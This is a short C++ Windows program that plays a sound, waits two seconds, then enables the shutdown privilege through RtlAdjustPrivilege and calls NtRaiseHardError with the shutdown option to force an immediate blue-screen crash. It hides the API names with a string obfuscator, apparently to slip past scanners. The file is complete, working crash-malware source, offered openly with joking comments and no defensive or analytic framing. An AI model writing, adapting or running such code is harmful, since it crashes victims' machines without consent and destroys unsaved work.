#include <Windows.h>
#include <chrono>
#include <thread>

//#include <iostream>
#include "Obf.h"

#define DELAYLENGTH 2000
#define DEFAULTKEY 'e'

#define DEFAULT_OBF(str) init(str, DEFAULTKEY)
#define DEFAULT_UNOBF() dec(DEFAULTKEY)

// look at the documentation of this bullshit here: https://undocumented.ntinternals.net/, https://www.pinvoke.net/default.aspx/ntdll.RtlAdjustPrivilege and in the mingw 64 source wdm.h at https://github.com/mirror/mingw-w64/blob/master/mingw-w64-headers/ddk/include/ddk/wdm.h

#define SE_SHUTDOWN_PRIVILEGE 19

enum HARDERROR_RESPONSE_OPTION {
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem
};

typedef NTSTATUS(__stdcall *RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, bool* Enabled);
typedef NTSTATUS(__stdcall *NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, int* Parameters, HARDERROR_RESPONSE_OPTION ResponseOption, int* Response);

int main()
{
	//std::cout << init("ettttt", DEFAULTKEY).dec(DEFAULTKEY);
	//std::cout << DEFAULT_OBF("poopoo").DEFAULT_UNOBF();

	PlaySound(MAKEINTRESOURCE(101), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC);

	std::this_thread::sleep_for(std::chrono::milliseconds(DELAYLENGTH));

	HMODULE libh = LoadLibraryA(DEFAULT_OBF("ntdll.dll").DEFAULT_UNOBF());

	LPVOID adjustPrivilegeAddr = GetProcAddress(libh, DEFAULT_OBF("RtlAdjustPrivilege").DEFAULT_UNOBF());
	LPVOID raiseErrorAddr = GetProcAddress(libh, DEFAULT_OBF("NtRaiseHardError").DEFAULT_UNOBF());

	RtlAdjustPrivilege _RtlAdjustPrivilege = (RtlAdjustPrivilege)adjustPrivilegeAddr;
	bool aa;
	_RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, true, false, &aa);

	NtRaiseHardError _NtRaiseHardError = (NtRaiseHardError)raiseErrorAddr;
	int bb;
	_NtRaiseHardError(0xC0000420, 0, 0, 0, HARDERROR_RESPONSE_OPTION::OptionShutdownSystem , &bb); // offset 420 marijuanaise
}
